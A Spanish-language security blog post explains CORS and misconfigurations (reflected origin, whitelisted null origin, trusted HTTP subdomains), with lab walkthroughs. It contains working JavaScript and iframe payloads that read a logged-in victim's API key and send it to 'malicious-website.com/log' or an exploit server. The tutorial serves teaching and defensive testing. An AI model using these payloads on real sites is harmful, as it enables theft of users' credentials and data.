+<p>La política del mismo origen es muy restrictiva y, en consecuencia, se han ideado varios enfoques para eludir las restricciones y aquí es donde entra el punto fundamental de este topic, la política CORS.</p>
+
+<p>Muchos sitios web interactúan con subdominios o sitios de terceros de una manera que requiere acceso completo entre orígenes. Es posible una relajación controlada de la política del mismo origen mediante el uso compartido de recursos de origen cruzado (CORS).</p>
+
+<p>El CORS utiliza un conjunto de encabezados HTTP que definen orígenes web confiables y propiedades asociadas estos se combinan en un intercambio de encabezados entre un navegador y el sitio web de origen cruzado al que intenta acceder. Uno de las cabeceras es <strong>Access-Control-Allow-Origin</strong></p>
+
+<p>El encabezado <strong>Access-Control-Allow-Origin</strong> se incluye en la respuesta de un sitio web a una solicitud de otro sitio web e identifica el origen permitido de la solicitud. Así, el navegador web compara el Access-Control-Allow-Origin con el origen del sitio web solicitante y permite el acceso a la respuesta si coinciden o si está permitido.</p>
+
+<p><br /></p>
+
+<h5 id="124-implementación-del-intercambio-simple-de-recursos-de-origen-cruzado">1.2.4. Implementación del intercambio simple de recursos de origen cruzado.</h5>
+
+<p>Como ya hemos indicado, el CORS prescribe le intercambio de contenido entre servidores web y navegadores sirviendo como un mecanismo de flexibilicación de la SOP. Esto se realiza mediante el uso de una serie de cabeceras de las cuales <em>Access-Control-Allow-Origin</em> es la más representativa; una cabecera que devuelve un serivdor en la respuesta a una request por parte de un origen externo.</p>
+
+<p>Para entender un poco mejor este mecanismo supongámos que un sitio web: normal-website.com genera la siguiente solicitud:</p>
+
+<pre><code class="language-default">GET /data HTTP/1.1
+Host: robust-website.com
+Origin: https://normal-website.com
+</code></pre>
+
+<p>Esta solicitud especifica que quiere coger un fichero <em>/data</em> de la aplicación <em>robust-website</em> y el origen de la solicitud parte del dominio <em>normal-website</em> tal y como se especifica en cada cabecera.</p>
+
+<p>Ahora, si el servidor <em>robust-website</em> quiere permitir que dicho sitio acceda a dicho recurso devolverá en la respuesta la mencionada cabecera Access-Control-Allow-Origin conteniendo como valor el dominio del sitio solicitante del recurso:</p>
+
+<pre><code class="language-default">HTTP/1.1 200 OK
+...
+Access-Control-Allow-Origin: https://normal-website.com
+</code></pre>
+
+<p>Así, como los origenes coinciden, el navegador permitirá que el código del solicitante se ejecute en la respuesta del solicitado.</p>
+
+<p>Además, conviene añadir que <strong>se puede configurar el servidor para que acepte el intercambio de datos cruzados si se le proporcionan unas credenciales validas incorporadas como cookies</strong>:</p>
+
+<pre><code class="language-default">GET /data HTTP/1.1
+Host: robust-website.com
+Origin: https://normal-website.com
+Cookie: JSESSIONID=&lt;value&gt;
+</code></pre>
+
+<p>En cuyo caso, la respuesta esperada será:</p>
+
+<pre><code class="language-default">HTTP/1.1 200 OK
+...
+Access-Control-Allow-Origin: https://normal-website.com
+Access-Control-Allow-Credentials: true
+</code></pre>
+
+<p>Es entre las distintas configuraciones de esta cabecera donde vamos a encontrar diversos métodos de bypass.</p>
+
+<p><br /></p>
+
+<h3 id="2-vulnerabilidades-planteadas-desde-la-configuración-cors">2. Vulnerabilidades planteadas desde la configuración CORS.</h3>
+
+<p>Muchos sitios web modernos usan CORS para permitir el acceso desde subdominios y terceros de confianza. La implementación del CORS puede contener errores o ser demasiado indulgente para garantizar que todo funcione, y esto puede dar lugar a vulnerabilidades explotables.</p>
+
+<p><br /></p>
+
+<ul>
+  <li><strong>Encabezado ACAO generado por el servidor a partir del encabezado Origin especificado por el cliente</strong></li>
+</ul>
+
+<p>Algunas aplicaciones necesitan proporcionar acceso a otros dominios. Mantener una lista de dominios permitidos requiere un esfuerzo continuo y cualquier error corre el riesgo de romper la funcionalidad. Por lo tanto, algunas aplicaciones toman la ruta fácil de permitir efectivamente el acceso desde cualquier otro dominio.</p>
+
+<p>Así, basta con solicitar un recurso y añadir la cabecera con el origen del solicitante para recibir los datos:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /sensitive-victim-data HTTP/1.1
+Host: vulnerable-website.com
+Origin: https://malicious-website.com
+Cookie: sessionid=...
+</code></pre></div></div>
+
+<p>Esto significa que la aplicación permite el intercambio de datos con cualquier otro dominio y estos pueden obtenerse implementando el siguiente script.</p>
+
+<pre><code class="language-default">var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true; req.send();
+
+function reqListener() { location='//malicious-website.com/log?key='+this.responseText; };
+</code></pre>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 1: CORS vulnerability with basic origin reflection</strong></p>
+
+<p>Este sitio web tiene una configuración CORS insegura que confía en todos los origenes.</p>
+
+<p>Para resolver este laboratorio vamos a craftear un código JavaScript que utiliza el CORS para obtener la API key del administrador y utilizarlo en un exploit. Se dispone de las credenciales de wiener:peter.</p>
+
+<p>En primer lugar accedemos al laboratorio y nos logeamos con nuestras credenciales. Una vez dentro observamos que tenemos una API key asignada y que el navegador es capaz de mostrarmela gracias a un GET a la página /accountDetails tal y como se puede ver en la pestaña HTTPhistory de Burp:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220503234436.png" text-align="center" />
+</div>
+
+<p>Por otra parte, la respuesta contiene la cabecera Access-Control-Allow, lo cual sugiere que utiliza el CORS para compartir recursos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220503234621.png" text-align="center" />
+</div>
+
+<p>De esta forma, vamos a comprobar si admite que cualquier origen puede acceder a los recursos de la página, para ello utilizamos el siguiente código JavaScript para obtener la API key de la respuesta:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+<span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">req</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nx">reqListener</span><span class="p">;</span>
+<span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">get</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">$url/accountDetails</span><span class="dl">'</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
+<span class="nx">req</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+<span class="kd">function</span> <span class="nx">reqListener</span><span class="p">()</span> <span class="p">{</span>
+
+<span class="nx">location</span><span class="o">=</span><span class="dl">'</span><span class="s1">/log?key=</span><span class="dl">'</span><span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
+
+<span class="p">};</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>Lo crafteamos como html en el servidor del exploit:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220503235135.png" text-align="center" />
+</div>
+
+<p>Y le damos a “view exploit” para comprobar que ha funcionado obteniendo que nuestra API key está dentro de la URL:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220503235258.png" text-align="center" />
+</div>
+
+<p>Así, todo lo que queda es entregar este script a la víctima (nuestro administrador). De esta forma, al visitar la víctima este sitio web se ejecutará el código JavaScript que solicitará el contenido de accountDetails, le será dado el contenido porque admite cualquier origen y después, al ver el Access log podremos ver una URL con el logeo del administrador y su API key:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220503235601.png" text-align="center" />
+</div>
+
+<p>Completando así el laboratorio.</p>
+
+<p><br /></p>
+
+<ul>
+  <li><strong>Valor de origen nulo incluido en la lista blanca</strong></li>
+</ul>
+
+<p>La especificación del encabezado Origin admite el valor <strong>null</strong>. Los navegadores pueden enviar el valor null en el encabezado Origen en varias situaciones inusuales. El caso es que en algunos casos, algunas aplicaciones pueden incluir en la lista blanca el valor null en la cabecera origin para admitir el desarrollo local de la aplicación. </p>
+
+<p>Por ejemplo, suponga que una aplicación recibe la siguiente solicitud:</p>
+
+<pre><code class="language-default">GET /data HTTP/1.1
+Origin: null
+</code></pre>
+
+<p>Devolviendo la respuesta:</p>
+
+<pre><code class="language-default">HTTP/1.1 200 OK
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+</code></pre>
+
+<p>En esta situación, un atacante puede usar varios trucos para generar una solicitud, como generar una solicitud ‘iframe’</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">sandbox=</span><span class="s">"allow-scripts allow-top-navigation allow-forms"</span> <span class="na">src=</span><span class="s">"data:text/html,
+&lt;script&gt;
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true; req.send();
+function reqListener() {
+
+location='malicious-website.com/log?key='+this.responseText;
+};
+&lt;/script&gt;"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 2: CORS vulnerability with trusted null origin</strong></p>
+
+<p>Este sitio web contiene una configuración insegura de CORS que permite el valor null como buena dentro del encabezado origin. Obtener la API key del administrador para completar el laboratorio. Se dispone de las credenciales wiener:peter.</p>
+
+<p>Lo primero que hacemos es logearnos como wiener peter y repasamos con Burp el historial del proxy para ver desde dónde y cómo se obtienen todos los recursos que se muestran a nuestro usuario.</p>
+
+<p>Entre ellos, obtenemos que los detalles de la cuenta se obtiene mediante un GET al apartado /accountDetails.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220504002021.png" text-align="center" />
+</div>
+
+<p>De esta forma, construimos una request al host mediante BurpRepeater e incorporamos el encabezado Origin y le damos un valor arbitrario:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220504002103.png" text-align="center" />
+</div>
+
+<p>Obtenemos un error y por tanto, existe alguna clase de filtro que bloquea nuestra solicitud. Pero al cambiar el valor por <strong>null</strong> obtenemos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220504002146.png" text-align="center" />
+</div>
+
+<p>Así, existe un fallo en la configuración del CORS de la aplicación web que da por valido el valor null y puede ser explotable.</p>
+
+<p>Como se trata del valor null, recurrimos a la etiqueta html iframe pra construir nuestro código tal y como hemos visto antes.</p>
+
+<p>Acudimos al servidor del exploit, pegamos nuestro exploit cambiando $url por la URL de nuestro laboratorio y $ exploit-server-url por la URL del servidor del exploit que aparece en la parte superior del mismo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220504002738.png" text-align="center" />
+</div>
+
+<p>y le damos a “view exploit”. En principio no aparecerá nada ya que se ha hecho una request null. Sin embargo, al darle al “access log” observamos que existe una serie de logs y entre ellos nuestro usuario y su API key:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220504003014.png" text-align="center" />
+</div>
+
+<p>Así, le damos a “Deliver to victim”, vamos al access log, copiamos la API key del admin y completamos el laboratorio.</p>
+
+<p><br /></p>
+
+<ul>
+  <li><strong>Ruptura de TLS con una malconfiguración de CORS</strong></li>
+</ul>
+
+<p>Supongamos que una aplicación que emplea rigurosamente HTTPS también incluye en la lista blanca un subdominio de confianza que usa HTTP simple. Es decir, existe un origen basado en http que puede compartir recursos con el sitio web:</p>
+
+<pre><code class="language-default">GET /api/requestApiKey HTTP/1.1
+Host: vulnerable-website.com
+Origin: http://trusted-subdomain.vulnerable-website.com
+Cookie: sessionid=...
+</code></pre>
+
+<p>Obteniendo como respuesta:</p>
+
+<pre><code class="language-default">HTTP/1.1 200 OK
+Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
+Access-Control-Allow-Credentials: true
+</code></pre>
+
+<p>En esta situación, un atacante que esté en posición de interceptar el tráfico de un usuario víctima puede explotar la configuración de CORS para comprometer la interacción de la víctima con la aplicación. </p>
+
+<p>Este ataque implica los siguientes pasos:</p>
+
+<ul>
+  <li>
+    <p>El usuario víctima realiza cualquier solicitud HTTP simple.</p>
+  </li>
+  <li>
+    <p>El atacante inyecta una redirección al sitio confiable mediante su origen.</p>
+  </li>
+  <li>
+    <p>El navegador de la víctima sigue la redirección. El atacante intercepta la solicitud HTTP simple y devuelve una respuesta falsificada que contiene una solicitud CORS para el sitio vulnerable.</p>
+  </li>
+  <li>
+    <p>De esta forma, el navegador de la víctima es el que hace incluyendo el origen de confianza, una request valida al sitio vulnerable con el que recolecta datos.</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 3: CORS vulnerability with trusted insecure protocols</strong></p>
+
+<p>Este sitio web tiene una configuración CORS insegura en la que confía en todos los subdominios independientemente del protocolo.</p>
+
+<p>Para resolver el laboratorio, vamos a crear un código JavaScript que usa CORS para recuperar la clave API del administrador y carguar el código en su servidor de explotación. El laboratorio se resuelve cuando envía correctamente la clave API del administrador.</p>
+
+<p>Puede iniciar sesión en su propia cuenta con las siguientes credenciales: wiener:peter</p>
+
+<p>Dado que se acepta cualquier subdominio independientemente del protocolo, colocamos el sigueinte código javascript:</p>
+
+<pre><code class="language-HTML">&lt;script&gt; document.location="http://stock.$your-lab-url/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script&gt;&amp;storeId=1" &lt;/script&gt;
+</code></pre>
+
+      </article>
+
+      
+        <div class="blog-tags">
+          <span>Tags:</span>
+          
+            <a href="/tags#burp">burp</a>
+          
+        </div>
+      
+
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id = "social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+    <a href="https://twitter.com/intent/tweet?text=13.+Cross-Origin+Resource+Sharing.&url=http%3A%2F%2Flocalhost%3A4000%2F2022-03-18-13.Cross-origin_resource_sharing_%28CORS%29%2F"
+      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2022-03-18-13.Cross-origin_resource_sharing_%28CORS%29%2F"
+      class="btn btn-social-icon btn-facebook" title="Share on Facebook">
+      <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
+      <span class="sr-only">Facebook</span>
+    </a>
+  
+
+  
+    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2022-03-18-13.Cross-origin_resource_sharing_%28CORS%29%2F"
+      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
+      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
+      <span class="sr-only">LinkedIn</span>
+    </a>
+  
+
+  
+
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pagination blog-pager">
+        
+        <li class="page-item previous">
+          <a class="page-link" href="/2022-03-17-12.Cross-site_request_forgery_(CSRF)/" data-toggle="tooltip" data-placement="top" title="12. Cross-Site Request Forgery.">&larr; Previous Post</a>
+        </li>
+        
+        
+        <li class="page-item next">
+          <a class="page-link" href="/2022-03-19-14.Clickjacking/" data-toggle="tooltip" data-placement="top" title="14. Clickjacking.">Next Post &rarr;</a>
+        </li>
+        
+      </ul>
+      
+  
+  
+  
+
+  
+
+
+  
+
+
+
+    </div>
+  </div>
+</div>
+
+
+  <footer>
+  <div class="container-md beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
+    <a href="/feed.xml" title="RSS">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">RSS</span>
+    </a>
+  </li><li class="list-inline-item">
+    <a href="mailto:sanmillan.german@gmail.com" title="Email me">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Email me</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://github.com/Qv1nTv5" title="GitHub">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">GitHub</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://twitter.com/Qvintvs1" title="Twitter">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Twitter</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://linkedin.com/in/german-sanmillan-68b308229/" title="LinkedIn">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">LinkedIn</span>
+   </a>
+  </li></ul>
+
+      
+      <p class="copyright text-muted">
+      
+        Qv1nTv5
+        &nbsp;&bull;&nbsp;
+      
+      2024
+
+      
+
+      
+      </p>
+      <p class="theme-by text-muted">
+        Powered by
+        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
+      </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  
+  
+    
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+
+  
+
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/assets/js/beautifuljekyll.js"></script>
+    
+  
+
+
+
+
+
+
+
+
+
+</body>
+</html>
